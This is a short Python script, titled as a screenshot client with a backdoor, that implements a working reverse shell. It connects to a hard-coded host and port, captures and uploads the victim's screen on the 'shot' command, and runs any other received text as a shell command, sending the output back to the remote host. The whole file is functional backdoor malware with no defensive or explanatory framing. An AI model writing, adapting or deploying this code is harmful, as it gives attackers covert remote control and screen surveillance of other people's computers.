# ScreenShot client Script with Backdoor
import socket
import subprocess
import os
from PIL import ImageGrab

def connecting():
    HOST = '192.168.43.85'
    PORT = 8080
    with socket.socket() as s:
        s.connect((HOST,PORT))
        while True:
            command = s.recv(1024)
            if b'terminate' in command:
                s.close()
                break
            elif b'shot' in command:
                
                try:
                    ImageGrab.grab().save("Screenshot.jpg", 'JPEG')
                    with open("Screenshot.jpg", 'rb') as f:
                        while True:
                            bits = f.read(1024)
                            if len(bits) == 0:
                                s.send(b'DONE')
                                break
                            s.send(bits)
                except:
                    
                    pass
            else:   
                    CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    s.send(CMD.stdout.read())
                    s.send(CMD.stderr.read())
                    
def main():
    connecting()
main()